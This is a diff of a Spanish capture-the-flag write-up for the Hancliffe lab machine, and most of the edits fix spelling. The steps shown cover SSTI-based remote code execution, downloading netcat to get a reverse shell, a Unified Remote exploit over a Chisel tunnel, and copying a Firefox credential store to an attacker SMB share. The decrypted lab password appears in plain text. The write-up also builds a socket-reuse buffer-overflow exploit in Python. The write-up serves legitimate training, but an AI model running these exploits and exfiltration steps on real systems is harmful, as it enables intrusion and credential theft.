@@ -18,7 +18,7 @@ tags:
   - SSTI
 ---
 
-Comence con un escaneo de Nmap para detectar puertos abiertos.
+Comencé con un escaneo de Nmap para detectar puertos abiertos.
 
 ```bash
 nmap -sS --min-rate 5000 -v -n -Pn -p- 10.10.11.115 -o nmap.txt
@@ -44,7 +44,7 @@ Nmap done: 1 IP address (1 host up) scanned in 26.50 seconds
            Raw packets sent: 131086 (5.768MB) | Rcvd: 22 (968B)
 ```
 
-Hice otro para identicar la version de cada servicio.
+Hice otro para identificar la versión de cada servicio.
 
 ```bash
 nmap -sCV -p80,8000,9999 10.10.11.115 -o services.txt
@@ -104,23 +104,23 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 155.32 seconds
 ```
 
-La pagina principal tenia lo siguiente:
+La página principal tenía lo siguiente:
 
 ![https://imgur.com/QVu20GJ.png](https://imgur.com/QVu20GJ.png)
 
-`nginx`, nada interasante, y por el puerto `8000`:
+`nginx`, nada interesante, y por el puerto `8000`:
 
 ![https://imgur.com/pUIBwny.png](https://imgur.com/pUIBwny.png)
 
-Parecia ser algun tipo de generador de contraseñas en base a lo que le ponias, hice una prueba.
+Parecía ser algún tipo de generador de contraseñas basándose en lo que le ponías, hice una prueba.
 
 ![https://imgur.com/M4OqzeN.png](https://imgur.com/M4OqzeN.png)
 
-Me genero una contraseña, pero no me servia para nada, lo deje en segundo plano y me conecte al puerto `9999` por `nc`.
+Me genero una contraseña, pero no me servía para nada, lo deje en segundo plano y me conecte al puerto '9999' por `nc`.
 
 ![https://imgur.com/BJhrGTy.png](https://imgur.com/BJhrGTy.png)
 
-Era un aplicativo que te pedia credenciales que no tenia, por lo que recurri a hacer *fuzzing* a la pagina principal y encontre el directorio `maintentance` que me llamo la atencion.
+Era un aplicativo que te pedía credenciales que no tenía, por lo que recurrí a hacer *fuzzing* a la página principal y encontré el directorio `maintentance` que me llamo la atención.
 
 ![https://imgur.com/jVQHWzg.png](https://imgur.com/jVQHWzg.png)
 
@@ -128,31 +128,31 @@ Accediendo al recurso hacia un *redirect* hacia un `404 Not Found`.
 
 ![image](https://user-images.githubusercontent.com/69093629/158074278-d0448566-7271-4265-9b25-c00a64879638.png)
 
-Envie una peticion `GET` a ese recurso para ver las cabeceras de respuesta.
+Envíe una petición `GET` a ese recurso para ver las cabeceras de respuesta.
 
 ![https://imgur.com/VtBaDIY.png](https://imgur.com/VtBaDIY.png)
 
-El *redirect* lo aplica por la cabecera `Location`, probe a acceder a un recurso que no existe con `..;` porque en el servidor estaba corriendo `java` y podria funcionar.
+El *redirect* lo aplica por la cabecera `Location`, probé a acceder a un recurso que no existe con `..;` porque en el servidor estaba corriendo `java` y podría funcionar.
 
 ![image](https://user-images.githubusercontent.com/69093629/158074567-f86e5dd8-90b9-44df-99c7-c451911f719c.png)
 
-Y si, no me aplico el *redirect*, esto me llamo la atencion, asi que probe a hacer *fuzzing* haciendo uso de `..;` y encontre muchos recursos.
+Y si, no me aplico el *redirect*, esto me llamo la atención, así que probé a hacer *fuzzing* haciendo uso de `..;` y encontré muchos recursos.
 
 ![https://imgur.com/fTVOduw.png](https://imgur.com/fTVOduw.png) 
 
-`/login.jsp`, accediendo encontre un panel de *login*.
+`/login.jsp`, accediendo encontré un panel de *login*.
 
 ![https://imgur.com/lFPcD5L.png](https://imgur.com/lFPcD5L.png)
 
-Abajo del todo estaba la version de `nuxeo`, hice una pequeña busqueda en busca de *exploits*.
+Abajo del todo estaba la versión de `nuxeo`, hice una pequeña búsqueda en busca de *exploits*.
 
 ![https://imgur.com/CMlGYZ1.png](https://imgur.com/CMlGYZ1.png)
 
-Este enviaba una peticion `GET` a una ruta dada aprovechando lo que parecia ser un `SSTI`.
+Este enviaba una petición `GET` a una ruta dada aprovechando lo que parecía ser un `SSTI`.
 
 ![https://imgur.com/600N9F1.png](https://imgur.com/600N9F1.png)
 
-Inmediatamente probe a verificar si era vulnerable.
+Inmediatamente, probé a verificar si era vulnerable.
 
 ![https://imgur.com/00IxCqb.png](https://imgur.com/00IxCqb.png)
 
@@ -160,55 +160,55 @@ Y si era vulnerable, me reporto `14` en el resultado del error.
 
 ![https://imgur.com/00IxCqb.png](https://imgur.com/00IxCqb.png)
 
-Ahora solo me faltaba encontrar la manera de ganar `RCE`, en *PayloadAllTheThings* encontre sentencias maliciosas que me permitieron ganar ejecucion de codigo arbitrario.
+Ahora solo me faltaba encontrar la manera de ganar `RCE`, en *PayloadAllTheThings* encontré sentencias maliciosas que me permitieron ganar ejecución de código arbitrario.
 
 ![image](https://user-images.githubusercontent.com/69093629/158074944-d67823a6-c860-4c2d-8d1b-8941951b10dc.png)
 
-Para verificarlo puse `tcpdump` en escucha de trazas `ICMP`.
+Para verificarlo, puse `tcpdump` en escucha de trazas `ICMP`.
 
 ![https://imgur.com/2bSFUJ7.png](https://imgur.com/2bSFUJ7.png)
 
-Tras recibir las trazas `ICMP` solo me faltaba ganar acceso a la maquina, abri un servidor de Python alojando `nc64.exe` y me lo descargue desde la maquina victima con `curl`, lo exporte a `C:\programdata\` ya que tenia capacidad de escritura.
- 
+Tras recibir las trazas `ICMP` solo me faltaba ganar acceso a la máquina, abrí un servidor de Python alojando `nc64.exe` y me lo descargue desde la máquina víctima con `curl`, lo exporte a `C:\programdata\`, ya que tenía capacidad de escritura.
+
 ![https://imgur.com/8AqlCuO.png](https://imgur.com/8AqlCuO.png)
 
-Envie otra peticion entablandome una conexion `TCP` desde el `nc64.exe` de la victima.
+Envíe otra petición entablándome una conexión `TCP` desde el `nc64.exe` de la víctima.
 
 ![https://imgur.com/IX1RYc1.png](https://imgur.com/IX1RYc1.png)
 
-Y gane acceso como usuario `svc_account`, cambie al directorio raiz y habia lo siguiente.
+Y gane acceso como usuario `svc_account`, cambie al directorio raíz y había lo siguiente.
 
 ![https://imgur.com/aizIIGt.png](https://imgur.com/aizIIGt.png)
 
-Nada fuera de lo normal, tampoco tenia capacidad de lectura de la *flag*, viendo los puertos que estaban corriendo internamente en la maquina, encontre los siguientes:
+Nada fuera de lo normal, tampoco tenía capacidad de lectura de la *flag*, viendo los puertos que estaban corriendo internamente en la máquina, encontré los siguientes:
 
 ![https://imgur.com/gFhoGq9.png](https://imgur.com/gFhoGq9.png)
 
-Para enumerar los puertos por su nombre y informacion adicional utilice el siguiente comando en Powershell:
+Para enumerar los puertos por su nombre e información adicional, utilicé el siguiente comando en PowerShell:
 
 ![https://imgur.com/OGvrlik.png](https://imgur.com/OGvrlik.png)
 
-Estaba corriendo este binario que me llamo la atencion por el puerto `9511`, lo deje en segundo plano.
+Estaba corriendo este binario que me llamo la atención por el puerto `9511`, lo deje en segundo plano.
 
 ![https://imgur.com/6P7N8oQ.png](https://imgur.com/6P7N8oQ.png)
 
-Tras una pequeña vista de todos los puertos que habia, hubo uno que tras una pequeña busqueda en Google lo delato, el puerto `9512`, encontre un *exploit* de `Unified Remote`.
+Tras una pequeña vista de todos los puertos que había, hubo uno que tras una pequeña búsqueda en Google lo delato, el puerto `9512`, encontré un *exploit* de `Unified Remote`.
 
 ![image](https://user-images.githubusercontent.com/69093629/158075856-e878de64-e70d-4af4-9c02-2ac474c2537a.png)
 
-Le tenia que pasar la IP del servidor vulnerable, el puerto y un binario malicioso, ya que este me haria el `certutil` para la descarga del mismo y me lo ejecutaria.
+Le tenía que pasar la IP del servidor vulnerable, el puerto y un binario malicioso, ya que este me haría el `certutil` para la descarga del mismo y me lo ejecutaría.
 
 ![https://imgur.com/NzkjYiL.png](https://imgur.com/NzkjYiL.png)
 
-El puerto `9512` estaba abierto internamente por lo que no tenia alcance desde fuera, por ello hice un reenvio de puertos con `Chisel`, abri un servidor en mi maquina.
+El puerto `9512` estaba abierto internamente por lo que no tenía alcance desde fuera, por ello hice un reenvío de puertos con `Chisel`, abrí un servidor en mí máquina.
 
 ![https://imgur.com/vi2CJsZ.png](https://imgur.com/vi2CJsZ.png)
 
-Y desde la otra maquina me conecte como cliente al servidor por el puerto `8888`.
+Y desde la otra máquina me conecté como cliente al servidor por el puerto `8888`.
 
 ![https://imgur.com/7ehkGMC.png](https://imgur.com/7ehkGMC.png)
 
-Y ya tenia el puerto `9512` accesible en mi `localhost`, lo verifique con `netstat -nat`.
+Y ya tenía el puerto `9512` accesible en mí `localhost`, lo verifiqué con `netstat -nat`.
 
 ![https://imgur.com/pqukMpB.png](https://imgur.com/pqukMpB.png)
 
@@ -216,31 +216,31 @@ Ejecute el *exploit*.
 
 ![https://imgur.com/pgR0W4k.png](https://imgur.com/pgR0W4k.png)
  
-Y gane acceso a la maquina como el usuario `clara`.
+Y gane acceso a la máquina como el usuario `clara`.
 
 ![https://imgur.com/m7hDmSQ.png](https://imgur.com/m7hDmSQ.png)
 
-Y ya tenia acceso a la *flag* del usuario.
+Y ya tenía acceso a la *flag* del usuario.
 
 ![evqvQWe](https://user-images.githubusercontent.com/69093629/158076491-96248ecd-0f7a-40d1-81df-424b4897d963.jpg)
 
-Enumerando bien encontre dos directorios de usuario de Firefox.
+Enumerando bien, encontré dos directorios de usuario de Firefox.
 
 ![https://imgur.com/3bDNgkV.png](https://imgur.com/3bDNgkV.png)
 
-El primero no tenia nada.
+El primero no tenía nada.
 
 ![https://imgur.com/MmCXphV.png](https://imgur.com/MmCXphV.png)
 
-El otro tenia muchos archivos y carpetas por lo que decidi descargarmelos a mi maquina, abri un servidor `smb`.
+El otro tenía muchos archivos y carpetas por lo que decidí descargármelos a mí máquina, abrí un servidor SMB.
 
 ![https://imgur.com/796GNli.png](https://imgur.com/796GNli.png)
 
-Me copie el directorio `ljftf853.default-release` a mi unidad con `copy -recurse ljftf853.default-release \\10.10.16.53\files`, tenia un archivo llamativo llamado `logins.json`.
+Me copié el directorio `ljftf853.default-release` a mi unidad con `copy -recurse ljftf853.default-release \\10.10.16.53\files`, tenía un archivo llamativo llamado `logins.json`.
 
 ![https://imgur.com/j9YqIgA.png](https://imgur.com/j9YqIgA.png)
 
-Tenia una *encryptedPassword* la cual podia descifrar si tenia el archivo `key4.db` o `key3.db`, lo cual tenia el primero, utilice la herramienta `firepwd.py` para ello, esta permitia descifrar contrasñea protegidas por Mozilla.
+Tenía una *encryptedPassword* la cual podía descifrar si tenía el archivo `key4.db` o `key3.db`, lo cual tenía el primero, utilice la herramienta `firepwd.py` para ello, esta permitía descifrar contraseña protegidas por Mozilla.
 
 ![https://imgur.com/bsThYSG.png](https://imgur.com/bsThYSG.png)
 
@@ -301,15 +301,15 @@ decrypting login/password pairs
 http://localhost:8000:b'hancliffe.htb',b'#@H@ncLiff3D3velopm3ntM@st3rK3y*!'
 ```
 
-Y en cuestion de segundos la descifro, habia otro usuario en el sistema llamado `development`.
+Y en cuestión de segundos la descifro, había otro usuario en el sistema llamado `development`.
 
 ![https://imgur.com/Hkp5v0U.png](https://imgur.com/Hkp5v0U.png)
 
-Esto realmente era una pista, si recordamos habia una pagina de generacion de contraseñas, entonces puse estas credenciales y el usuario `development`.
+Esto realmente era una pista, si recordamos había una página de generación de contraseñas, entonces puse estas credenciales y el usuario `development`.
 
 ![https://imgur.com/XMXafJq.png](https://imgur.com/XMXafJq.png)
 
-La contraseña generada me podria servir para autenticarme por `winrm` haciendo uso del usuario `development` ya que estaba dentro del grupo *Remote Managment Users*, pero no esta expuesto, por lo que tuve que hacer otro reenvio de puertos del puerto `5985`, me abri un servidor en mi maquina con `Chisel` por el puerto `8888` y me conecte como cliente desde la maquina victima.
+La contraseña generada me podría servir para autenticarme por `winrm` haciendo uso del usuario `development`, ya que estaba dentro del grupo *Remote Managment Users*, pero no está expuesto, por lo que tuve que hacer otro reenvío de puertos del puerto '5985', me abrí un servidor en mí máquina con `Chisel` por el puerto `8888` y me conecte como cliente desde la máquina víctima.
 
 ![https://imgur.com/6GhBOVH.png](https://imgur.com/6GhBOVH.png)
 
@@ -320,42 +320,42 @@ Ahora si, me autentique con el usuario `development` por `winrm`.
 <hr>
 <h1 align="center"><b>ESCALADA DE PRIVILEGIOS</b></h1>
 
-Para la escalada me acorde del binario que corria por el puerto `9511` en la maquina llamado `MyFirstApp.exe`.
+Para la escalada me acordé del binario que corría por el puerto `9511` en la máquina llamado `MyFirstApp.exe`.
 
 ![https://imgur.com/6P7N8oQ.png](https://imgur.com/6P7N8oQ.png)
 
-Me lo transferi a mi maquina y le hice `reversing` con `ghidra`, habia una funcion `_login` con unas credenciales.
+Me lo transferí a mí máquina y le hice `reversing` con `ghidra`, habia una función `_login` con unas credenciales.
 
 ![https://imgur.com/21LQBve.png](https://imgur.com/21LQBve.png)
 
-La contraseña parecia estar en base64, la decodifique.
+La contraseña parecía estar en base 64, la decodifiqué.
 
 ![https://imgur.com/C9M15RW.png](https://imgur.com/C9M15RW.png)
 
-Pero no me sirvio de nada hasta que vi las funciones *_encrypt1* y *_encrypt2*.
+Pero no me sirvió de nada hasta que vi las funciones *_encrypt1* y *_encrypt2*.
 
 ![https://imgur.com/rfJvtHv.png](https://imgur.com/rfJvtHv.png)
 
-Esta es *_encrypt1*, estaba remplazando la primera letra por la utlima y asi sucesivamente, se estaba aplicando el algoritmo de codificacion `atbash`. 
+Esta es *_encrypt1*, estaba remplazando la primera letra por la última y así sucesivamente, se estaba aplicando el algoritmo de codificación `atbash`.
 
-La segunda esta ROT47, remplaza un caracter ASCII con el caracter 47 despues de él.
+La segunda, esta ROT47, remplaza un carácter ASCII con el carácter 47 después de él.
 
 ![https://imgur.com/dhCcMBy.png](https://imgur.com/dhCcMBy.png)
 
-Primero hice el proceso inverso de Base64, despues Atbash y finalmente ROT47, quedo esta contraseña.
+Primero hice el proceso inverso de Base 64, después `atbash` y finalmente ROT47, quedo esta contraseña.
 
 ![https://imgur.com/5JrBaoL.png](https://imgur.com/5JrBaoL.png)
 ![https://imgur.com/9T4jqCl.png](https://imgur.com/9T4jqCl.png)
 
-Analizando mas el binario encontre esta otra funcion llamada *_SavedCreds*, esta sirve para almacenar las credenciales, el problema es que usa `strcpy` para copiar el *buffer* que esta definido en *50 bytes*, esto provoca un desbordamiento del búfer.
+Analizando más el binario encontré está otra función llamada *_SavedCreds*, esta sirve para almacenar las credenciales, el problema es que usa `strcpy` para copiar el *buffer* que está definido en *50 bytes*, esto provoca un desbordamiento del búfer.
 
 ![https://imgur.com/rh4YpkS.png](https://imgur.com/rh4YpkS.png)
 
-Entrando un poco mas en detalle en la funcion *_login*, veo que se esta entablando una conexion, un *socket* con *400 bytes* de longitud despues de introducir algo en un campo llamado *Input Your Code*, este me llamo la atencion, porque si me conecto al puerto `9999` desde `nc` y utilizo las credenciales que tengo...
+Entrando un poco más en detalle en la función *_login*, veo que se está entablando una conexión, un *socket* con *400 bytes* de longitud después de introducir algo en un campo llamado *Input Your Code*, este me llamo la atención, porque si me conecto al puerto `9999` desde `nc` y utilizo las credenciales que tengo...
 
 ![https://imgur.com/DX2y69H.png](https://imgur.com/DX2y69H.png)
 
-Exacto, este binario es el que esta corriendo por el puerto `9999` externamente en la maquina y es vulnerable a BoF, por lo que le introduje muchas A y corrompio.
+Exacto, este binario es el que está corriendo por el puerto `9999` externamente en la máquina y es vulnerable a BoF, por lo que le introduje muchas A y corrompió.
 
 ![https://imgur.com/6EilS5h.png](https://imgur.com/6EilS5h.png)
 
@@ -365,7 +365,7 @@ Para aprovecharme de esto lo explote primero en local, inicie `x32dbg` y el bina
 
 Primero me cree una cadena especial con `pattern_create` para encontrar los *bytes* antes de sobrescribir *EIP*.
 
-En el *exploit* comence definiendo la libreria `pwn` para poder interactuar con el binario, y `sys` para definir los argumentos que hay que pasarle, tambien defino una clase llamada *Exploit* con un inicializador al que le he pasado tres variables, que serian el usuario, la contraseña y el nombre, y finalmente defino un metodo que es por donde va a empezar el flujo del *exploit*.
+En el *exploit* comencé definiendo la librería `pwn` para poder interactuar con el binario, y `sys` para definir los argumentos que hay que pasarle, también defino una clase llamada *Exploit* con un inicializador al que le he pasado tres variables, que serian el usuario, la contraseña y el nombre, y finalmente defino un método que es por donde va a empezar el flujo del *exploit*.
 
 ```python
 #!/usr/bin/python3
@@ -401,25 +401,25 @@ if __name__ == '__main__':
 	main()
 ```
 
-Comence comprobando que el *exploit* funcionaba bien.
+Comencé comprobando que el *exploit* funcionaba bien.
 
 ![https://imgur.com/DjhCekr.png](https://imgur.com/DjhCekr.png)
 
-Lo segundo que hice fue desactivar *DEP* ya que de lo contrario no podria ejecutar insturucciones en la pila, esto se puede hacer desde opciones de rendimiento.
+Lo segundo que hice fue desactivar *DEP*, ya que de lo contrario no podría ejecutar instrucciones en la pila, esto se puede hacer desde opciones de rendimiento.
 
 ![image](https://user-images.githubusercontent.com/69093629/158053356-f85bd4e2-26b6-4eee-8443-bd67148422a2.png)
 
-Ahora si podia seguir, primeramente con `pattern_create` me cree una cadena especial diciendole con cuentos *bytes* mi programa corrompe, le puse 200, esto es para saber cuantos *bytes* hay que pasarle antes de sobrescribir *EIP*.
+Ahora si podía seguir, primeramente con `pattern_create` me cree una cadena especial diciéndole con cuentos *bytes* mi programa corrompe, le puse 200, esto es para saber cuantos *bytes* hay que pasarle antes de sobrescribir *EIP*.
 
 ![https://imgur.com/59c7Dxy.png](https://imgur.com/59c7Dxy.png)
 
-En el *script* añadi la siguiente linea con la cadena generada por `pattern_create` en la variable `payload`.
+En el *script* añadí la siguiente línea con la cadena generada por `pattern_create` en la variable `payload`.
 
 ```python
 payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
 ```
 
-Tras ejecutar el *exploit* esta era la direccion que tenia *EIP*:
+Tras ejecutar el *exploit* esta era la dirección que tenía *EIP*:
 
 ![image](https://user-images.githubusercontent.com/69093629/158053163-095e228b-5263-409d-8490-fcdcf1d467f1.png)
 
@@ -427,7 +427,7 @@ La copie y la pegue en `pattern_offset`.
 
 ![https://imgur.com/8QkhGlx.png](https://imgur.com/8QkhGlx.png)
 
-Ahi esta, el *offset* son 66 *bytes* antes de sobrescribir *EIP*. Probe a enviar 100 B con la siguiente cadena actualizando la variable `payload`:
+Ahí esta, el *offset* son 66 *bytes* antes de sobrescribir *EIP*. Probé a enviar 100 B con la siguiente cadena actualizando la variable `payload`:
 
 ```python
 payload = 66*"\xBB"
@@ -437,8 +437,8 @@ Este fue el resultado:
 
 ![image](https://user-images.githubusercontent.com/69093629/158054696-f4f21223-8294-49b9-b6bc-46fac2970c10.png)
 
-Como se puede apreciar no estan todas las B que he enviado, esto sucede porque el *buffer* definido esta muy limitado, aqui tenemos un problema, ya que si no tenemos suficiente espacio no podremos inyectar nuestro `shellcode`, aqui hice uso de una tecnica llamada *socket reuse*, se basa en la reutilizacion de sockets para inyectar *shellcode*, ya que suele haber suficiente espacio para aprovechar.
-El siguiente paso fue hacer una busqueda de direcciones que contengan `jmp esp` en la direccion de `push esp`.
+Como se puede apreciar no están todas las B que he enviado, esto sucede porque el *buffer* definido está muy limitado, aquí tenemos un problema, ya que si no tenemos suficiente espacio no podremos inyectar nuestro `shellcode`, aquí hice uso de una técnica llamada *socket reuse*, se basa en la reutilización de *sockets* para inyectar *shellcode*, puesto que suele haber suficiente espacio para aprovechar.
+El siguiente paso fue hacer una búsqueda de direcciones que contengan `jmp esp` en la dirección de `push ebp`.
 
 ![image](https://user-images.githubusercontent.com/69093629/158063903-6abcc2e7-94db-40a6-af83-f97e4def4077.png)
 
@@ -448,7 +448,7 @@ Este fue el resultado en la pestaña *References*.
 
 ![image](https://user-images.githubusercontent.com/69093629/158054325-56210e63-9237-4362-90ae-4a70cc74f91d.png)
 
-Hice un *breakpoint* en una direccion parecida a la que estaba en `push ebp`, en este caso `719023A8`, esta me iva a servir como "direccion de retorno", la sume a la variable `payload` en *little endian*.
+Hice un *breakpoint* en una dirección parecida a la que estaba en `push ebp`, en este caso `719023A8`, esta me iba a servir como "dirección de retorno", la sume a la variable `payload` en *little endian*.
 
 ```python3
 payload = 66*"xBB" + p32(0x719023A8)
@@ -456,33 +456,33 @@ payload = 66*"xBB" + p32(0x719023A8)
 
 ![image](https://user-images.githubusercontent.com/69093629/158064075-9759fa85-47a4-4593-b0aa-896a94c98826.png)
 
-Tras una ejecucion del exploit *ESP* se convirtio en `023FFF18`, despues de darle en `Step Into` la direccion *ESP* se paso a *EIP*.
+Tras una ejecución del exploit *ESP* se convirtió en `023FFF18`, después de darle en `Step Into` la dirección *ESP* se pasó a *EIP*.
 
 ![image](https://user-images.githubusercontent.com/69093629/158204266-485fd528-bb37-4282-9885-8a2e3d228e08.png)
 
-*EIP* apuntaba al final de mis *bytes* y tenia que hacer que apunte desde el principio para que el flujo del programa vaya para abajo y pase por una direccion con el *buffer* del *socket*. Para ello lo que hice fue abrir `nasm_shell.rb` y restar *70 bytes* ya que el *buffer* son *66 bytes* + *4 bytes* de la direccion.
+*EIP* apuntaba al final de mis *bytes* y tenía que hacer que apunte desde el principio para que el flujo del programa vaya para abajo y pase por una dirección con el *buffer* del *socket*. Para ello lo que hice fue abrir `nasm_shell.rb` y restar *70 bytes* porque el *buffer* son *66 bytes* + *4 bytes* de la dirección.
 
 ![image](https://camo.githubusercontent.com/4ea6db709a78753caa9c6bb36d61881023fcfc848f6d4cc86381f56f6216a42c/68747470733a2f2f696d6775722e636f6d2f4c4465456658432e706e67)
 
-Este *opcode* lo añadi a la variable `payload`.
+Este *opcode* lo añadí a la variable `payload`.
 
 ```python
 payload = 66*"xBB" + p32(0x719023A8) + b"\xeb\xb8"
 ```
 
-Ya tenia *EIP* apuntando al principio de mi cadena.
+Ya tenía *EIP* apuntando al principio de mi cadena.
 
 ![image](https://user-images.githubusercontent.com/69093629/158063097-834bc72a-85fc-4e2a-b023-6614aebfc548.png)
 
-Lo siguiente fue identificar la funcion `recv` del *socket* y hacer un *breakpoint* cuando hace la llamada.
+Lo siguiente fue identificar la función `recv` del *socket* y hacer un *breakpoint* cuando hace la llamada.
 
 ![image](https://user-images.githubusercontent.com/69093629/158064764-801a1679-4d33-4b05-9e06-2fba17d5e5be.png)
 
-Esto lo hice para ver la estructura de direcciones de la funcion `recv`.
+Esto lo hice para ver la estructura de direcciones de la función `recv`.
 
 ![image](https://user-images.githubusercontent.com/69093629/158064829-e784b600-a774-4c47-b972-d98cc3c546cd.png)
  
-La primera direccion es el descriptor que identifica al *socket*, la segunda el *buffer* para recibir los datos, en este caso el *shellcode*, la tercera la longitud, en este caso *400 bytes* como hemos visto con `ghidra` y la ultima son las *flags*, estas direcciones se interpretan de abajo para arriba por eso tuve que adecuarlo a como estan, esto se puede ver mejor de esta manera:
+La primera dirección es el descriptor que identifica al *socket*, la segunda el *buffer* para recibir los datos, en este caso el *shellcode*, la tercera la longitud, en este caso *400 bytes* como hemos visto con `ghidra` y la última son las *flags*, estas direcciones se interpretan de abajo para arriba por eso tuve que adecuarlo a como están, esto se puede ver mejor de esta manera:
 
 ```c++
 int recv(
@@ -493,38 +493,38 @@ int recv(
 );
 ```
 
-Hice un `push` de *ESP* para apilarla al final del todo de la pila y luego hice un `pop` a `eax` para desapilar *ESP* y que *EAX* tenga la direccion de *ESP*.
+Hice un `push` de *ESP* para apilarla al final del todo de la pila y luego hice un `pop` a `eax` para des apilar *ESP* y que *EAX* tenga la dirección de *ESP*.
 
 - Esto es lo que hace `push` y `pop`
 
 ![Stack-sv](https://user-images.githubusercontent.com/69093629/158243788-f79f393a-3d76-4566-8de4-653e425c66eb.png)
 
-Corri el programa y me hizo el *push esp*.
+Corrí el programa y me hizo el *push esp*.
 
 ![image](https://user-images.githubusercontent.com/69093629/158067158-c6ee094b-bd55-4d0f-bc0d-a93b62b49845.png)
  
-El valor que tenia en *EAX* era el siguiente:
+El valor que tenía en *EAX* era el siguiente:
 
 ![image](https://user-images.githubusercontent.com/69093629/158067231-6083bdc4-d712-4e10-8719-d9ca33ac8d0a.png)
  
-Entonces ahora el valor de *ESP* tenia que estar al final, es decir la ultima direccion de la pila.
+Entonces ahora el valor de *ESP* tenía que estar al final, es decir, la última dirección de la pila.
 
 ![image](https://user-images.githubusercontent.com/69093629/158067243-76ff6958-8e91-4f6d-8fab-d425f14e0a84.png)
  
-Y ahora tras hacer un `pop eax`, la direccion de *ESP* que es `023FFF28` estaba en el registro *EAX*.  
+Y ahora, tras hacer un `pop eax`, la dirección de *ESP* que es `023FFF28` estaba en el registro *EAX*.
 
 ![image](https://user-images.githubusercontent.com/69093629/158067246-ead6c5e1-731d-43aa-b5ab-42718edce4b0.png)
  
-Todo esto lo hice para poder hacer operaciones aritmeticas y operaciones de entrada y salida con este registro, mi idea era que el descriptor del *socket* que estaba en la posicion 60 este al final de la pila, la ultima direccion, para ello reste 60 a 18, ya que este debe estar adecuado al *socket*.
+Todo esto lo hice para poder hacer operaciones aritméticas y operaciones de entrada y salida con este registro, mi idea era que el descriptor del *socket* que estaba en la posición 60 este al final de la pila, la última dirección, para ello reste 60 a 18, ya que este debe estar adecuado al *socket*.
 
 ![image](https://user-images.githubusercontent.com/69093629/158065231-14a2d3e1-59ed-4758-8fee-b64c8ec12404.png)
 
-Tras hacer `0x60 - 0x18` el resultado fue `0x48`, pero el resultado tenia un *null byte*, este no debia estar ya que de lo contrario el *exploit* no funcionaria como debe, para evitar esto hice una suma de `0x230` ya que no tenia *null byte* y le reste `0x48`, el resultado fue `0x1E8`, de esta manera el resultado no tenia un *byte* nulo y se comportaba de la misma forma.
+Tras hacer `0x60 - 0x18` el resultado fue `0x48`, pero el resultado tenía un *null byte*, este no debía estar porque de lo contrario el *exploit* no funcionaria como debe, para evitar esto hice una suma de `0x230` porque no tenía *null byte* y le reste `0x48`, el resultado fue `0x1E8`, de esta manera el resultado no tenía un *byte* nulo y se comportaba de la misma forma.
 
 ![image](https://camo.githubusercontent.com/725da9cc3eded4dace28def1c8ba625b63fe18697fa91232b5a17aec8c93cdc7/68747470733a2f2f696d6775722e636f6d2f7a3970703457752e706e67)
 
-En el *script* tenia los *opcode* que restaban 70 para posicionar *ESP* (actua como "direccion de retorno") al principio de las A y los *opcode* de `push esp` y `pop eax`, estos en la variable `recv`.
-La variable `payload` hacia los calulos, suma `recv` a la cadena restante de A tras restar los 66 *bytes* a la longitud de `recv` y despues suma la direccion de `jmp esp` a los *opcode*.
+En el *script* tenía los *opcode* que restaban 70 para posicionar *ESP* (actúa como "dirección de retorno") al principio de las A y los *opcode* de `push esp` y `pop eax`, estos en la variable `recv`.
+La variable `payload` hacia los cálculos, suma `recv` a la cadena restante de A tras restar los 66 *bytes* a la longitud de `recv` y después suma la dirección de `jmp esp` a los *opcode*.
 
 ```python
 recv = b""
@@ -536,7 +536,7 @@ recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8
 payload = recv + b"\xAA"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70
 ```
 
-Ahora bien, el valor del descriptor del *socket* lo tenia que almacenar en un registro para poder llamarlo despues, en este caso *ESI*, lo que hice fue mover el valor de *EAX* que ahora contenia la direccion del descriptor del *socket* a *ESI*.
+Ahora bien, el valor del descriptor del *socket* lo tenía que almacenar en un registro para poder llamarlo después, en este caso *ESI*, lo que hice fue mover el valor de *EAX* que ahora contenía la dirección del descriptor del *socket* a *ESI*.
 
 ![image](https://camo.githubusercontent.com/a62946076fea31cbfa323bdda18d8096476cdf506e8a34ae1f4a384e6a2fe480/68747470733a2f2f696d6775722e636f6d2f527142656a67792e706e67)
 
@@ -545,34 +545,34 @@ El *opcode* lo introduje en el *exploit* en la variable `recv`.
 ```python
 recv += b"\x8b\x30" # -> mov esi, [eax]
 ```
-Ejecute el *exploit* y *EAX* tenia la direccion en la que estaba el descriptor del *socket*, `024BFF60`.
+Ejecute el *exploit* y *EAX* tenía la dirección en la que estaba el descriptor del *socket*, `024BFF60`.
 
 ![image](https://user-images.githubusercontent.com/69093629/158068089-76ebeb6d-c46d-4810-9f03-8d6652b52ef3.png)
  
-Tras hacer un `Step Into` ya tenia almacenado el descriptor en *ESI*, ya tenia el descripor del *socket* hecho, ahora solo me quedaba el *buffer*, la longitud y las *flags* pero tenia un pequeño incoveniente, *EIP* ira para abajo donde se puede encontrar con *ESP*, esto podria generar problemas.
+Tras hacer un `Step Into` ya tenía almacenado el descriptor en *ESI*, ya tenía el descriptor del *socket* hecho, ahora solo me quedaba el *buffer*, la longitud y las *flags*, pero tenía un pequeño inconveniente, *EIP* ira para abajo donde se puede encontrar con *ESP*, esto podría generar problemas.
 
 ![image](https://user-images.githubusercontent.com/69093629/158069800-9f65129c-07de-4226-abe7-9ca123a0553e.png)
  
-Para solucionarlo simplemente reste 70 *bytes* a `ESP`.
+Para solucionarlo simplemente resté 70 *bytes* a `ESP`.
 
 ![image](https://camo.githubusercontent.com/2a54af66cd0aa62eea60c0cd3322c17940f686f2456736bed2e705fb02e3d096/68747470733a2f2f696d6775722e636f6d2f346d59664771582e706e67)
  
-Esto lo hice porque asi posiciono *ESP* por encima de *EIP* y no habrian problemas cuando *EIP* interprete para abajo.
+Esto lo hice porque así posiciono *ESP* por encima de *EIP* y no habrían problemas cuando *EIP* interprete para abajo.
 
 ![image](https://user-images.githubusercontent.com/69093629/158068284-575dc5f1-f4b5-4265-8905-a2da779ee1e4.png)
  
